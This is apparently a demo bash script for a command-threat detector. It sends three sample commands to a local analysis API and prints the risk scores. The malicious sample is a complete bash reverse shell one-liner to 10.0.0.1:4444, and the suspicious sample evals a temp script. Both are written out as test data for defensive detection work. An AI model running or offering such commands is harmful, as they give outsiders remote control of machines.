#!/bin/bash
# Demo script - runs sample commands to show the detection system in action

echo "🎬 AI Bouncer + Kernel Guard Demo"
echo "=================================="
echo ""

# Auto-detect API URL and verify reachability.
# In WSL, localhost forwarding may work, but sometimes only the Windows host IP works.
pick_api_url() {
    local candidate
    local windows_ip

    if grep -qi "microsoft" /proc/version 2>/dev/null; then
        windows_ip=$(ip route show | grep default | awk '{print $3}')
        echo "🔗 Running in WSL. Probing backend endpoints..."

        for candidate in "http://localhost:8000" "http://${windows_ip}:8000"; do
            if curl -s --connect-timeout 2 --max-time 4 "${candidate}/" >/dev/null; then
                API_URL="${candidate}/analyze"
                echo "✅ Using backend at: ${candidate}"
                return 0
            fi
        done

        echo "❌ Could not reach backend from WSL on localhost or ${windows_ip}."
        echo "   Start backend with: uvicorn backend.app:app --host 0.0.0.0 --port 8000"
        echo "   Then retry this demo script."
        exit 1
    else
        API_URL="http://localhost:8000/analyze"
        echo "🔗 Running on native Linux, using localhost"
    fi
}

pick_api_url

echo ""
echo "Make sure the backend is running in another terminal:"
echo "  Backend URL: $API_URL"
echo ""
echo "Press Enter to start the demo..."
read

# Function to test a command
test_command() {
    local cmd="$1"
    local expected="$2"
    
    echo ""
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo "Testing: $cmd"
    echo "Expected: $expected"
    echo ""
    
    response=$(curl -s --connect-timeout 2 --max-time 8 -X POST "$API_URL" \
        -H "Content-Type: application/json" \
        -d "{\"command\":\"$cmd\"}")

    if [ -z "$response" ]; then
        echo "❌ No response from backend (timeout/unreachable)."
        echo "   API URL: $API_URL"
        return 1
    fi
    
    echo "Response:"
    echo "$response" | python3 -m json.tool || echo "$response"
    echo ""
}

# Helper function for narrative pausing
pause_for_next() {
    echo ""
    read -p "Press Enter to continue to the next stage..."
    echo ""
}

# --- STAGE 1: Benign Activity ---
echo "✅ STAGE 1: BENIGN ACTIVITY"
echo "We will run a standard system command. Watch the dashboard to see it flagged as Safe."
test_command "ls -la /var/log" "safe"
echo "💡 Narrative: The command is a common administrative action with no risky patterns. The ML model assigns a low risk score."
pause_for_next

# --- STAGE 2: Suspicious Activity ---
echo "⚠️  STAGE 2: SUSPICIOUS ACTIVITY"
echo "Next, an obfuscated script execution that attempts to hide its intent."
test_command "eval \$(cat /tmp/script.sh)" "suspicious"
echo "💡 Narrative: The system detected risky patterns ('eval' and 'cat' combination). This elevated the risk score, flagging it for review without immediately killing it."
pause_for_next

# --- STAGE 3: Malicious Activity ---
echo "🚨 STAGE 3: MALICIOUS ACTIVITY"
echo "Finally, an active reverse shell attempt connecting to an external IP."
test_command "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" "malicious"
echo "💡 Narrative: Critical hit! The AI Bouncer confidently identifies a reverse shell. The risk score spikes, and if Auto-Remediation is ON, the kernel hook terminates the process before it can execute."

echo ""
echo "✅ Demo complete! Check the dashboard at http://localhost:5173 to review the alerts and explanations."
echo ""
